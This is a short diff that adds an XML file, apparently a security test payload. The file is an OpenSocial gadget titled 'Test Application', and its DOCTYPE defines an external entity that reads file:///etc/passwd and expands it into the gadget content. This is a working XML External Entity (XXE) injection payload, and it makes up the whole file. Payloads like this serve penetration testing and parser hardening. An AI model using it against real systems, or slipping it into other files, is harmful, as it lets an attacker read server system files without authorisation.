@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<Module>
+<ModulePrefs title="Test Application">
+<Require feature="opensocial-0.9" />
+</ModulePrefs>
+<Content type="html">
+&xxe;
+</Content>
+</Module>
